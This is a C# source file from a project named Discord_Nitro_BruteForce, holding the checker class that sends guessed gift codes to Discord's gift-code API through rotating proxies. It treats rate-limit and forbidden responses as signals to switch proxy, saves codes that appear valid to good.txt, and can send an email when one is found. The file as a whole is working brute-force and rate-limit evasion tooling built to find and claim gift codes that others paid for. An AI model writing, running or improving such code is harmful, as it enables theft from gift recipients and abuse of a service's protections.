using Leaf.xNet;
using System;
using System.IO;
using System.Threading;

namespace Discord_Nitro_BruteForce
{
    class Checker
    {
        static object fileLocker = new object();
        public static void Check(string code, ProxyClient proxy)
        {
            using (HttpRequest req = new HttpRequest()
            {
                IgnoreProtocolErrors = true,
                Proxy = proxy
            })
            {
                HttpResponse res = req.Get($"https://discordapp.com/api/v6/entitlements/gift-codes/{code}");

                if(res.StatusCode == HttpStatusCode.TooManyRequests || res.StatusCode == HttpStatusCode.Forbidden)
                {
                    if (Program.verbose)
                    {
                        Console.ForegroundColor = ConsoleColor.Yellow;
                        Console.WriteLine($"[-] {code}: {res.StatusCode}");
                    }
                    throw new HttpException();
                }
                    
                Interlocked.Increment(ref Program.ch);

                if(res.StatusCode == HttpStatusCode.NotFound)
                {
                    if (Program.verbose)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine($"[-] {code}");
                    }
                    return;
                }

                //if (res.StatusCode == HttpStatusCode.OK || res.StatusCode == HttpStatusCode.Found || res.StatusCode == HttpStatusCode.Accepted)
                //{
                Interlocked.Increment(ref Program.goods);
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"[+] {code} (StatusCode: {(int)res.StatusCode})"); //I don't know status code of valid nitro gift

                lock (fileLocker)
                {
                    File.AppendAllText("good.txt", code);
                }

                if (Program.emailnotification)
                    Program.SendEmail(code, "Hey! I founded valid code!");
                //}
            }
        }
    }
}
